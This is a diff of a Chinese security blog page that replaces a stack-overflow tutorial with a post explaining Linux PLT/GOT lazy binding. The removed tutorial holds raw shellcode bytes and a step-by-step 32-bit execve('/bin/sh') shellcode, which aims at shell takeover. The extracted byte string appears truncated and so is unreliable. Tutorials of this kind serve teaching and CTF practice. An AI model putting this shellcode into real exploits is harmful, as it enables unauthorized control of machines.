@@ -12,7 +12,7 @@
     
     <title>
         
-            栈溢出指南 | 
+            linux上的延迟重定位 | 
         
         mian&#39;s blog
     </title>
@@ -36,7 +36,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="mian">
     <meta name="description" itemprop="description" content="这是mian的博客">
-    <meta name="keywords" content=",pwn,栈">
+    <meta name="keywords" content=",linux,plt&got">
 
     <!-- Site Verification -->
     
@@ -65,10 +65,10 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://yoursite.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="栈溢出指南 | mian&#39;s blog">
+    <meta property="og:title" content="linux上的延迟重定位 | mian&#39;s blog">
     <meta property="og:image" content="/img/pic.png" />
     <meta property="og:description" content="这是mian的博客">
-    <meta property="og:article:tag" content="pwn"> <meta property="og:article:tag" content="栈"> 
+    <meta property="og:article:tag" content="linux"> <meta property="og:article:tag" content="plt&amp;got"> 
 
     
         <meta property="article:published_time" content="6月 14, 2018" />
@@ -76,7 +76,7 @@
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="栈溢出指南 | mian&#39;s blog">
+    <meta name="twitter:title" content="linux上的延迟重定位 | mian&#39;s blog">
     <meta name="twitter:description" content="这是mian的博客">
     <meta name="twitter:image" content="/img/pic.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -84,7 +84,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://yoursite.com/2018/06/14/栈溢出指南/index.html" />
+        <link rel="canonical" href="http://yoursite.com/2018/06/14/linux-banding/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -110,8 +110,8 @@
         },
         "description": "你好，我是mian，欢迎来到我的博客"
     },
-    "headline": "栈溢出指南",
-    "url": "http://yoursite.com/2018/06/14/栈溢出指南/index.html",
+    "headline": "linux上的延迟重定位",
+    "url": "http://yoursite.com/2018/06/14/linux-banding/index.html",
     "datePublished": "6月 14, 2018",
     "dateModified": "6月 14, 2018",
     "description": "这是mian的博客",
@@ -327,7 +327,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#栈溢出简易指南"><span class="post-toc-number">1.</span> <span class="post-toc-text">栈溢出简易指南</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#主题："><span class="post-toc-number">1.1.</span> <span class="post-toc-text">主题：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shellcode"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">shellcode</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#shellcode的编写"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">shellcode的编写</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-address"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">return-to-address</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EIP的定位"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">EIP的定位</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp的写法"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">exp的写法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-register-绕过aslr"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">return-to-register(绕过aslr)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实现"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">实现</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#局限"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">局限</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#return-to-libc-绕过NX"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">return to libc(绕过NX)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据执行保护"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">数据执行保护</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理-1"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">利用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#局限-1"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">局限</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#linux上的延迟重定位"><span class="post-toc-number">1.</span> <span class="post-toc-text">linux上的延迟重定位</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#主题"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">主题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件外函数的调用原理"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">文件外函数的调用原理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#函数调用的汇编实现"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">函数调用的汇编实现</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#生成汇编"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">生成汇编</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#重定向"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">重定向</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#函数的调用"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">函数的调用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延迟重定位"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">延迟重定位</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#公共plt的具体实现"><span class="post-toc-number">1.2.6.</span> <span class="post-toc-text">公共plt的具体实现</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#dl-runtime-resolve"><span class="post-toc-number">1.2.7.</span> <span class="post-toc-text">_dl_runtime_resolve</span></a></li></ol></li></ol></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -365,7 +365,7 @@
         
     
             <p class="article-headline-p">
-                栈溢出指南
+                linux上的延迟重定位
             </p>
         </div>
 
@@ -406,7 +406,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACd0lEQVR42u3aQXLCMBAEQP7/afKAFM6M1lKcVPtEgQvUPmiX0b7e//p64eHh4eHh4eHhPYz3iq/r+79/56d3Pn16/X6yNjw8PLyTvB+22svFXd+Tv/70KPO14eHh4Z3n5T+Tl4rrJeafFmvDw8PDexgvKQyTcjIvHnh4eHhP4yUhwvU9yTt4eHh4f4XXNr5JY52EvElhOJS14OHh4cW89gDs5OtfON/Dw8PDu+TVI02DZSXhRVIMiqErPDw8vA28PCZoI4m1Qas2Gl7MWvDw8PBu4rWH+smPzZvp+qHg4eHhbeZN4oCkeORFZS16wMPDwzvPy//8r8HW2uXkSOzjI8PDw8PbzGsb4vbIf95818MEeHh4eEd4+babbOLtp3koHMXKeHh4eJt57SY+P/JvAfX34+Hh4R3k3bY1lwUgb51viHHx8PDwxrw59b10JaFwO/6Fh4eHd4ZXh6TxYEHbjue8Hx49Hh4e3mbe2gFY3li3kfHkNR4eHt5JXrKs4gfKEHbtSKz+x4CHh4e3gbe4EZdx7VrxKAJiPDw8vM28yXY/iSfWyk8UcODh4eFt5uXbcXvn2sNaC3zx8PDwzvPaKHYywJqUlvZh4eHh4Z3k5W1rPibVDktNGvH6HwMeHh7emNde7UDVWlGZHIPh4eHh7ebdNXKat8tt4akDETw8PLwjvDzYbZe71kAna4hiXDw8PLzNvLYY7IC1AcdtMS4eHh7eNl5+EHW9lHy5dZyBh4eH90heMi4weRBJk33z6AAeHh7eEi/ZiKMgNRgvSB7NYruPh4eHd4Q3DwJuO74qI90towN4eHh4l7z/d+Hh4eHh4eHh4T3g+gIRZkoVvHt6EwAAAABJRU5ErkJggg==">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACaklEQVR42u3aW3ICMQwEQO5/6eQCWTJjec2j2l8pIODeD1klz+Pnq9cDDw8PDw8PDw/vzXiPeP3xReXrV+9e/cra3vDw8PDO8P4ptcF2803vekyXDwsPDw/vIO+q4F59ZlLok29r94aHh4f3KbykZF9R134XDw8P73N5a59J3sXDw8P7FF5e4tsmu22+XzZrwcPDw4t5+SXT+b+P3u/h4eHhBbw60hS0uZORxM944eHh4d3NywvxGnJ+2OQhMDw8PLwzvPxa63npnxwP+TVbPcbFw8PDu42XtNH5ADcH5210Hl/Aw8PDO8N73jRPRhJtk9225nh4eHiv4uVN8K6owVo0IXp8eHh4eDfz2gKdlPv2SMgPp2hggYeHh3eEN9/05EjIL8CisTIeHh7ezbx2aDsp9HvDBEV0AA8PD28rb16420OijRdsGEbg4eHh3cbLL8DaT7ahq2Ski4eHh/cqXt5eTzYxPwZuyZTh4eHhjfOceUSgLe5tRGCtKcfDw8M7ycsPhqTEJ5HTPBDw/KjY3FLj4eHhlamktUFtXsrXglx1i4+Hh4d3kJcU5XboMGnEk7BCHR3Aw8PD28qLhqSD19vSv3bM4OHh4Z3k5YOAPDoQbahc/zxQPDw8vJt57co3lwPaA2lb6AoPDw9videW473NdF76F0NXeHh4eLfx8sMgB7ejhPZgWJy14OHh4W3lTQr02iVWGzgYha7w8PDw3oDX/le+3YiBh4eH9xW8PCC1Np6Irtzw8PDwDvLWLr2SYUQSKWgDDXh4eHiv5U1GAAkyfxztwYOHh4d3nvd9Cw8PDw8PDw8P7w3WL9WvxHAywogIAAAAAElFTkSuQmCC">
     
 </ul>
     
@@ -419,7 +419,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/pwn/">pwn</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/栈/">栈</a>
+        <a class="post_tag-link" href="/tags/linux/">linux</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/plt-got/">plt&got</a>
     </ul>
     
 
@@ -435,7 +435,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=栈溢出指南&url=http://yoursite.com/2018/06/14/栈溢出指南/index.html&pic=&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=linux上的延迟重定位&url=http://yoursite.com/2018/06/14/linux-banding/index.html&pic=&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -444,7 +444,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=栈溢出指南&url=http://yoursite.com/2018/06/14/栈溢出指南/index.html&via=mian" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=linux上的延迟重定位&url=http://yoursite.com/2018/06/14/linux-banding/index.html&via=mian" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -453,7 +453,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/14/栈溢出指南/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/14/linux-banding/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -462,7 +462,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/14/栈溢出指南/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/14/linux-banding/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -486,197 +486,147 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>一个关于栈溢出的指南</p>
-<h1 id="栈溢出简易指南"><a href="#栈溢出简易指南" class="headerlink" title="栈溢出简易指南"></a>栈溢出简易指南</h1><h2 id="主题："><a href="#主题：" class="headerlink" title="主题："></a>主题：</h2><ul>
-<li><p>基本栈溢出</p>
-</li>
-<li><p>针对缓存区溢出防护的对策</p>
-</li>
+        <p>熟练地掌握linux的 <strong>链接</strong>与 <strong>绑定</strong>不仅仅是研究return to plt的必要，更是掌握linkmap、got表覆写、dlresolve等技术的基础</p>
+<h1 id="linux上的延迟重定位"><a href="#linux上的延迟重定位" class="headerlink" title="linux上的延迟重定位"></a>linux上的延迟重定位</h1><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><ul>
+<li>plt、got表</li>
+<li>延迟绑定</li>
+<li>软硬链接</li>
 </ul>
 <hr>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>栈溢出的最终目的是执行shellcode，夺取shell，因此本文将会从shellcode开始讲起。</p>
-<p>shellcode通常是软件漏洞利用中的一小段代码，主要用于启动shell或干一些奇怪的事来让攻击控制正台机器</p>
+<h2 id="文件外函数的调用原理"><a href="#文件外函数的调用原理" class="headerlink" title="文件外函数的调用原理"></a>文件外函数的调用原理</h2><h3 id="函数调用的汇编实现"><a href="#函数调用的汇编实现" class="headerlink" title="函数调用的汇编实现"></a>函数调用的汇编实现</h3><p>假如有这样一个代码<code>system(&quot;cat flag&quot;)</code></p>
+<p>在程序流流向这里的时候会发生什么样的事情呢？</p>
+<p>我事先写好了一个这样的程序。让我们拖到ida里面好好看一看。</p>
+<pre><code>push    offset command ; &quot;cat flag&quot;
+call    _system
+add     esp, 10h
+</code></pre><p>可以看见他调用了_system，这个_system和libc里面的system不是一个东西。</p>
+<p>我们点开_system可以看见</p>
+<pre><code>.plt:08048410 ; =============== S U B R O U T I N E =========================
+.plt:08048410
+.plt:08048410 ; Attributes: thunk
+.plt:08048410
+.plt:08048410 ; int system(const char *command)
+.plt:08048410 _system         proc near               ; CODE XREF: main+163↓p
+.plt:08048410
+.plt:08048410 command         = dword ptr  4
+.plt:08048410
+.plt:08048410                 jmp     ds:off_804A014
+.plt:08048410 _system         endp
+.plt:08048410
+.plt:08048416 ; --------------------------------------------------------------
+</code></pre><p>我们发现了这里面有着plt三个字，这就是所谓的plt表中的一部分。</p>
+<p>再点开</p>
+<pre><code>ds:off_804A014
+</code></pre><p>我们就会发现</p>
+<pre><code>.got.plt:0804A014 off_804A014     dd offset system        ; DATA XREF: _system↑r
+</code></pre><p>我们发现了这里面有着got三个字，这就是所谓的got表中的一部分。</p>
+<h3 id="生成汇编"><a href="#生成汇编" class="headerlink" title="生成汇编"></a>生成汇编</h3><p>为什么需要有plt与got这些东西，而不在程序中直接<code>call system</code>这样的方法来访问system，的原因在于system是在glibc库中，而glibc属于动态库。</p>
 <blockquote>
-<p>\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x46\x55\x43\x4b\x0a</p>
+<p>如果读者了解过windows的动态链接库的话，事实上这两者有所区别，但是大致原理基本相似</p>
 </blockquote>
-<p>这段代码的就是一段shellcode，其功能为</p>
-<pre><code>print(&quot;fuck&quot;);
-return 0;
-</code></pre><p>当然，想要写一段shellcode也不是特别难，主要流程为</p>
+<p>之所以无法直接直接<code>call system</code>，这正是用为程序中调用system的代码是在编译和链接中（事实上主要在编译中）确立的，而在此过程中，system的地址，编辑器无从而知。而在现代操作系统中，代码段也无法更改，所以试图在加载过程<code>call aaaaa</code>改为<code>call xxxxx(&amp;system)</code>也是无用功。</p>
+<p>同时因为编辑器同时无法确定system函数是在libc这样的动态库中还是在其他的中间文件（.o）中所以编辑会生成一样格式的代码，这使得无论你的某函数是在动态链接库中还是在其它文件中给出定义，这样的汇编代码都能实现调用system。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>但是函数的调用总归是需要函数的具体地址的。那么就可以把情况分为两种。</p>
 <blockquote>
-<p>使用c语言描述shellcode要完成的逻辑功能<br>将C语言翻译成汇编语言<br>编译和测试<br>测试通过后提取机器码</p>
+<ol>
+<li>静态链接库</li>
+<li>动态链接库（如glibc）</li>
+</ol>
 </blockquote>
-<p>有两个书写shellcode时需要注意的问腿</p>
+<p>在这两种情况中：</p>
+<p>前一种函数的位置在编译过程中是已知的，所以在编译过程中可以计算出在编译过程中填进去占位的地址距离程序在被载入后此函数位置的偏移量，并将其填入某个位置。这就是 <strong>链接时重定位</strong>。</p>
+<p>后一种函数的位置在运行时是已知的，算出偏移量中也填入此表中。这就是 <strong>运行时重定位</strong>。</p>
+<h3 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h3><p>在完成了重定向之后，函数的调用还面临着一个问题。那就是，在无法改变代码段的情况下，应当如何利用数据段中的偏移量呢。</p>
+<p>答案是程序在链接中就生成一小段专门利用偏移量的代码。</p>
+<p>链接器生成额外的伪代码如下：</p>
+<pre><code>.text
+...
+
+// 调用system的call指令
+call system_stub
+...
+
+system_stub:
+mov rax, [system函数的储存地址] ; 获取system重定位之后的地址
+jmp rax ; 跳过去执行system函数
+
+.data
+...
+system函数的储存地址 ;这里储存system函数重定位后的地址
+</code></pre><p>在链接的过程中，如果发现函数实际上是动态链接库的代码，就会添加以上代码，并将system改为system_sub。</p>
+<p>所以实际上在函数的调用中我们需要两样东西</p>
 <blockquote>
-<p>由于缓存区漏洞是由于无长度限定的print家族（输入的是字符串，依靠’\0’(ascii码为0)结尾）造成的，所以shellcode不能有0字节，否则会被截断。<br>由于漏洞一般不能溢出无限大的字符串，所以不应该过于长。</p>
+<ul>
+<li>需要存放外部函数的数据段</li>
+<li>获取数据段存放函数地址，并且正确的访问他们的一小段额外代码</li>
+</ul>
 </blockquote>
-<p>shellcode一般达成以下功能</p>
+<p>又因为动态库的函数往往不止一个所以许多这样的数据段与许多这样的代码形成了两张表。存储函数相对地址的表叫做 <strong>全局偏移表</strong>，即 <strong>got表</strong>,而存储那段额外的代码的表被叫做 <strong>程序链接表</strong>，即 <strong>plt表</strong>。</p>
+<h3 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h3><p>前文提到了函数的地址放在got表中，所以把got中的数据段填充满必须优先于调用之前，</p>
+<p><strong>延迟重定位</strong>，故名思意，一大特点是 <strong>延迟</strong>。</p>
 <blockquote>
-<p>提升权限为root，即调用suid(0)<br>启开bash，全面控制系统，即调用execve(“/bin/bash, NULL, NULL);<br>打开网络端口，让攻击者连接该端口进行控制<br>反向连接攻击者提供的端口，进行反向控制。（反弹shell）</p>
+<p>延迟即尽可能的延迟，直到不得不执行为止。之所以linux会有这样的特性，是因为如果动态库函数非常之多，那么放在前面一起执行会大大地减弱程序的启动时间。所以linux使用延迟重定位机制来使载入动态库地时间被均匀分散到了执行时间中。</p>
+</blockquote>
+<p>这就产生了一个问题：程序如何知道GOT表中某一数据项是否已经被载入（因为程序中的函数可能会被执行多次，这样子就不必每一次都去重定位了）。</p>
+<p>在程序中地具体实现大致为</p>
+<pre><code>void system@plt()
+{
+address_good:
+jmp *system@got            // 链接器将system@got填成下一语句lookup_system的地址
+return；
+lookup_system:
+        调用重定位函数查找system地址，并写到system@got
+
+        goto address_good;
+}
+</code></pre><p>当第一次运行system函数时，程序流会跳到system@plt，然后会顺势执行jmp *system@got，但是很显然，got表中的数据项并没有填充正确的值。其实程序流并没有前往所谓的system@got，实际上它前往了lookup_system中去，这个函数的功能是调用重定位的函数来寻找system的函数地址，并将其写入system@got中去，然后再跳到addr_good，执行system然后返回到调用者。这样子下面的lookup_system就相当于被废除了。</p>
+<p>然后在第二次调用system时，就直接走向system的真正的地址中。</p>
+<p>事实上重定位中的最后实现并没有每一个plt中都含有符号解析与重定位的那一部分。所以程序中实现具体实现为。</p>
+<pre><code>jmp     *system@got
+push    id(当前函数在plt中的偏移量/2)
+jmp     common@plt
+</code></pre><h3 id="公共plt的具体实现"><a href="#公共plt的具体实现" class="headerlink" title="公共plt的具体实现"></a>公共plt的具体实现</h3><p>在上文中我们基本缕清了函数重定向的前世今生与大致实现方式。接下来我要重点讲一下这个公共的函数的实现方式。</p>
+<p>我们先在ida里看看这个函数的具体实现，在这里ida的F5已经无能为力了，我们硬刚下源码试试</p>
+<pre><code>.plt:08048300 common          proc near               ; CODE XREF: .plt:0804831B↓j
+.plt:08048300                                         ; .plt:0804832B↓j ...
+.plt:08048300 ; __unwind {
+.plt:08048300                 push    ds:dword_804A004
+.plt:08048306                 jmp     ds:dword_804A008
+.plt:08048306 common          endp
+</code></pre><p>很显然这个所谓的804A008就是所谓的重定向函数，而上面的804A004，就是参数。</p>
+<p>而在这些地方放的就是</p>
+<pre><code>.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: common↑r
+.got.plt:0804A008 ; int (*dword_804A008)(void)
+.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: common+6↑r
+</code></pre><p>在下面我们发现了</p>
+<pre><code>.got.plt:0804A00C off_804A00C     dd offset read          ; DATA XREF: _read↑r
+.got.plt:0804A010 off_804A010     dd offset __gmon_start__
+.got.plt:0804A010                                         ; DATA XREF: ___gmon_start__↑r
+.got.plt:0804A014 off_804A014     dd offset __libc_start_main
+.got.plt:0804A014                                         ; DATA XREF: ___libc_start_main↑r
+.got.plt:0804A018 off_804A018     dd offset write         ; DATA XREF: _write↑r
+.got.plt:0804A018 _got_plt        ends
+.got.plt:0804A018
+</code></pre><p>发现接着跑下去就已经看不懂了</p>
+<p>随手点一个进去</p>
+<pre><code>extern:0804A034                 extrn write:near        ; CODE XREF: _write↑j
+extern:0804A034                                         ; DATA XREF: .got.plt:off_804A018↑o
+</code></pre><p>好像是一个声明一样的东西。</p>
+<p>经过了观看大神写的微博以后，我发现如果使用gdb进行动态调试的话，这个common，在没有进行运行时，其的值为0x0，在运行后会变成它的值会变成另一个值，而这个值最终指向的是 <strong>_dl_runtime_resolve</strong>,而这一个处于动态链接器中的函数。</p>
+<h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><p>因为每一个plt表里的函数都需要调用这个公共的dlresolve项，所以dlresolve得知道需要查找的是哪一个函数，并将GOT表的值写在哪个函数的plt段。因为在plt表里push了一个参数，我上面也写了你如果去算算的话，它与函数在plt表中的偏移量相同</p>
+<p>在程序内部，维持有一个重定位信息表。利用<code>readelf -r test</code>,可以看见.rel.plt段中的消息</p>
+<pre><code>Offset     Info     Type             Sym.Value  Sym. Name
+080496f8   00000107 R_386_JUMP_SLOT  00000000   puts
+080496fc   00000207 R_386_JUMP_SLOT  00000000   __gmon_start__
+08049700   00000407 R_386_JUMP_SLOT 000000000   __libc_start_main
+</code></pre><p>程序可以通过这个公共的offset表，找到应当被填写GOT表函数的地址的位置。</p>
+<blockquote>
+<p>其实想要彻底搞清楚这个过程还需要对于elf文件在linux系统的装载有着更深的理解才行，所以我这边的讲解只是浅尝辄止不深究了。</p>
+</blockquote>
+<blockquote>
+<p>日后讲解这个dlresolve的时候还会像详细讲解这个过程与可能的利用。</p>
 </blockquote>
 <hr>
-<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><p>虽然现在到处都可以找到现成的shellcode，但是我认为到还是有必要学习shellcode的编写。</p>
-<p>下面我将阐述关于shellcode编写构成中的小问题的解决</p>
-<p>虽然说由于栈溢出的漏洞多半是不能在构成参数的字节里中出现0。但是很明显，在代码中多半会出现0。</p>
-<p>例如：</p>
-<blockquote>
-<p>MOV eax,0<br>MOV eax,0x00000005(前三个字节都是零会把作为参数的字符串截断)</p>
-</blockquote>
-<p>有以下两个方法可以解决这个问题，完成寄存器清零与给寄存器赋予一个极小的数。</p>
-<blockquote>
-<p>xor eax eax 这样就可以将将eax置零<br>还有cld可以将edx进行置零</p>
-</blockquote>
-<p>如果需要将eax的值赋为0x5，不能直接写成mov eax, 0x05，因为它会生成机器码mov eax, 0x00000005，会有0填充（因为一个字节只能有8位你丢进去了32位那自然会有数据为零的内存基本单元出现）。</p>
-<p>可以采用下面这个技巧：</p>
-<blockquote>
-<p>xor eax, eax<br>mov al, 0x05</p>
-</blockquote>
-<p>虽然说在有些情况下，我们可以知道shellcode的绝对地址，从而跳转到shellcode处，但是在有些情况下shellcode中shellcode的位置是会变化的，这导致了shellcode所要填写的地址难以确定。但是我们可以使用另一个技巧来进行处理。<br>例如call技术：<br>call指令是相对转跳，但会在栈上压上绝对地址，然后再弹出就可以获取绝对地址</p>
-<pre><code>jmp short get_string
-code:
-       pop eax            ; 这里弹出的是call指令压栈的下条指令的地址，即&quot;hello world&quot;字符串的地址
-get_string:
-      call code
-data:
-db &apos;hello world&apos;, 0x0a
-</code></pre><p>linux系统调用是通过 int 0x80来陷入内核态的，在此过程中系统调用号通过eax来传递，而参数则是通过ebx，ecx,edx，esi来传递的。</p>
-<p>在补充了这些基础知识后我们开始真正的着手开始编写shellcode,可以直接使用gcc对汇编文件.S进行编译链接，生成标准的可执行ELF文件，同时也是直接进行测试，但又一点不方便的是提取机械码很不方便。</p>
-<p>为了提高提取机械码的效率，nasm编译器生成bin格式文件，而且没有其他东西，棒棒哒</p>
-<p>例如我们想要书写一个夺取shell的shellcode，我们需要书写的核心代码是</p>
-<pre><code>char *argv[2];
-
-argv[0] = &quot;/bin/sh&quot;;
-argv[1] = NULL;//指针数组需要以NULL结束不然会接着寻找接下去的指针
-
-execve(&quot;/bin/sh&quot;, argv, NULL);//execve是内核级系统调用，第二个参数为数组指针，第三个参数为新的环境变量
-</code></pre><blockquote>
-<p>excve的系统调用号为11</p>
-</blockquote>
-<p>接下来我们将会将其转化为汇编代码（需要注意寄存器传参这一情况）<br>先将字符串压到栈上</p>
-<pre><code>xor edx, edx
-push edx
-push 0x68732f2f
-push 0x6e69622f
-</code></pre><p>这样子压入了”/bin/sh”，应该注意因为地址是从高地址向低地址蔓延的，所以需要从字符串的尾巴开始压起。</p>
-<blockquote>
-<p>字符串在内存中的分布如下<br>低 结束’\0’<br>↑↑ 第三部分<br>↑↑ 第二部分<br>高 第一部分<br>换言之，栈顶指向的永远是一块数据的开始</p>
-</blockquote>
-<blockquote>
-<p>由于我们需要让shellocde尽可能的短，所以我们不需要将没用的数据从堆栈中拿出，只需要简单的弃用就可以了</p>
-</blockquote>
-<p>紧接着将这个字符串的指针也就是现在的栈顶取出,并压入栈中</p>
-<pre><code>mov ebx,esp
-push ebx
-</code></pre><p>由于我们前面所对edx做的操作使得edx的值是0（即NULL）所以只需要</p>
-<pre><code>push edx
-</code></pre><p>就把argv的数据全放在栈里了，然后</p>
-<pre><code>mov ecx,esp
-</code></pre><p>最后把系统调用号即11赋给eax</p>
-<pre><code>xor eax eax
-mov al 0xb
-</code></pre><p>这样操作过后，eax为系统调用号，ebx为“/bin/sh”，ecx为argv，edx为新的环境变量，大功告成，紧接着我们</p>
-<pre><code>int 0x80
-</code></pre><p>进行系统调用，大功告成。拼接过后的代码为</p>
-<pre><code>BITS 32  
-
-xor edx, edx  
-push edx  
-push 0x68732f2f  
-push 0x6e69622f  
-
-mov ebx, esp  
-
-push edx  
-push ebx  
-
-mov ecx, esp  
-
-xor eax, eax  
-mov al, 0xb  
-
-int 0x80  
-</code></pre><p>编译生成机器码</p>
-<pre><code>nasm -o shell2 shell2.s
-</code></pre><p>生成的shell2文件为bin数据，全是机器码，没有任何格式数据，使用Linux命令转换成bash或者perl可输入的shellcode.</p>
-<pre><code>$ od -t x1 shell2 | sed -e &apos;s/[0-7]*//&apos; | sed -e &apos;s/ /\\x/g&apos;
-</code></pre><p>得到</p>
-<blockquote>
-<p>\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52<br>\x53\x89\xe1\x31\xc0\xb0\x0b\xcd</p>
-</blockquote>
-<p>这就是我们的shellcode了</p>
-<hr>
-<h2 id="return-to-address"><a href="#return-to-address" class="headerlink" title="return-to-address"></a>return-to-address</h2><p>有了以上的这些知识我们就可以使用最为简单的ret2addr攻击了。<br>技术的核心是使用覆盖EIP来返回到确认地址，虽然十分简单粗暴，但是随着32位与64位的普及与alsr技术的普及逐渐失去功效，但是在某些特殊的场合这种技术仍然闪烁着光辉。千里之途，始于足下，下面让我们来学习这门技术吧。</p>
-<p>首先我们先温习一遍内存中的数据存放</p>
-<blockquote>
